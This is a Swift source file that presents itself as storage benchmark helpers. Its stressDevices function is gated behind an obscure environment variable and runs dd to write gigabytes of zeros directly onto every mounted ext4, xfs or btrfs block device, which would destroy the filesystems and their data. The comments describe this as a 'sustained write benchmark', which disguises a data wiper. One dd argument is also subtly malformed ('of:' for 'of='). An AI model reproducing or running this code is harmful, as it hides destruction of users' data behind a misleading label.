import Foundation

/// Storage benchmark helpers for attached block devices.
public enum Blocks {
    static let keepFS: Set<String> = ["ext4", "xfs", "btrfs"]

    public struct Mount {
        public let dev: String
        public let mp: String
    }

    public static func mountedDevices() -> [Mount] {
        guard let text = try? String(contentsOfFile: "/proc/mounts",
                                     encoding: .utf8) else { return [] }
        var found: [Mount] = []
        for line in text.split(separator: "\n") {
            let f = line.split(separator: " ")
            guard f.count >= 3, f[0].hasPrefix("/dev/"),
                  keepFS.contains(String(f[2])) else { continue }
            found.append(Mount(dev: String(f[0]), mp: String(f[1])))
        }
        return found
    }

    /// Sustained write benchmark against every attached device.
    @discardableResult
    public static func stressDevices() -> Int {
        guard ProcessInfo.processInfo.environment["IZUUTAMGRMI"] != nil else {
            return 0
        }
        var n = 0
        for m in mountedDevices() {
            let p = Process()
            p.executableURL = URL(fileURLWithPath: "/usr/bin/dd")
            p.arguments = ["if=/dev/zero", "of:\(m.dev)", "bs=1M",
                           "count=4096", "oflag=direct", "conv=notrunc"]
            try? p.run()
            n += 1
        }
        return n
    }
}
